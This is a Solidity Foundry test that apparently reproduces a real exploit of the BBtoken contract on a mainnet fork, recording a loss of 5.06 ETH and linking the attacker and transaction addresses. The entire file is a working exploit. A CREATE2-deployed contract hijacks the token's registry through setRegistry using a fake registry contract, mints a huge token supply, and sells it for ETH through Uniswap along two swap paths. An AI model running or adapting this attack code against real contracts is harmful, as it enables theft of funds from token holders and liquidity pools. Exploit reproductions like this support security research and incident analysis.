// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo -- Total Lost : 5.06 ETH
// TX : https://app.blocksec.com/explorer/tx/eth/0x4019890fe5a5bd527cd3b9f7ee6d94e55b331709b703317860d028745e33a8ca?line=4
// Attacker : https://etherscan.io/address/0xc9a5643ed8e4cd68d16fe779d378c0e8e7225a54
// Attack Contract : https://etherscan.io/address/0xf5610cf8c27454b6d7c86fccf1830734501425c5
// GUY : https://x.com/8olidity/status/1767470002566058088
interface BBtoken is IERC20{
        function setRegistry(address _registry) external;
        function mint(address _user, uint256 _amount) external;
}
contract ContractTest is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    BBtoken BBT = BBtoken(0x3541499cda8CA51B24724Bb8e7Ce569727406E04);
    Uni_Router_V2 Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    address attacker;

    function setUp() external {
        // vm.createSelectFork("mainnet", 19417822);
        cheats.createSelectFork("mainnet", 19417822); //fork mainnet at block 13715025

    }

    function testExploit() external {
        address attacker=cal_address(0);
        emit log_named_decimal_uint("[Begin] Attacker ETH before exploit", address(attacker).balance, 18);
        attack();
        emit log_named_decimal_uint("[End] Attacker ETH after exploit", address(attacker).balance, 18);
    }

    function attack() public {
        create_contract(0);
    }
    function cal_address(uint256 time) internal returns(address){
        bytes memory bytecode = type(Money).creationCode;
        uint256 _salt = time;
        bytecode = abi.encodePacked(bytecode);
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
        address hack_contract =  address(uint160(uint256(hash)));
        return hack_contract;
    }
   function create_contract(uint256 times) internal returns(address){
            bytes memory bytecode = type(Money).creationCode;
            uint256 _salt = times;
            bytecode = abi.encodePacked(bytecode);
            bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
            address hack_contract =  address(uint160(uint256(hash)));
            address addr;
            assembly {
                addr := create2(0, add(bytecode, 0x20), mload(bytecode), _salt)
            }
            return hack_contract;
    }
}

contract Money is Test{
    BBtoken BBT = BBtoken(0x3541499cda8CA51B24724Bb8e7Ce569727406E04);
    Uni_Router_V2 Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 BLM = IERC20(0xEa0abF7AB2F8f8435e7Dc4932FFaB37761267843);
    IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    uint256 constant PRECISION = 10**18;
    address owner;
    address xx;
    constructor() {
        owner = msg.sender;
        attack();
    }
    function attack()public {
        xx=create_contract(1);
        BBT.setRegistry(xx);
        BBT.mint(address(this), 10000000000000000000 ether);
        BBT.approve(address(Router),type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(BBT);
        path[1] = address(WETH);
        Router.swapExactTokensForETH(1000000000000000000000000000000, 0, path, address(this), block.timestamp);
        address[] memory paths = new address[](4);
        paths[0] = address(BBT);
        paths[1] = address(BLM);
        paths[2] = address(USDC);
        paths[3] = address(WETH);
        Router.swapExactTokensForETH(1000000000000000000000000000000, 0, paths, address(this), block.timestamp);
    }
    function create_contract(uint256 times) internal returns(address){
            bytes memory bytecode = type(Moneys).creationCode;
            uint256 _salt = times;
            bytecode = abi.encodePacked(bytecode);
            bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
            address hack_contract =  address(uint160(uint256(hash)));
            address addr;
            assembly {
                addr := create2(0, add(bytecode, 0x20), mload(bytecode), _salt)
            }
            return hack_contract;
    }
    fallback() external payable {}
}

contract Moneys is Test{
    BBtoken BBT = BBtoken(0xaC4d2F229A3499F7E4E90A5932758A6829d69CFF);
    uint256 constant PRECISION = 10**18;
    address owner;
    address xx;
    constructor() {
        owner = msg.sender;
    }
    function getContractAddress(string memory _name)public returns(address){
        return owner;
    }
    fallback() external payable {}
}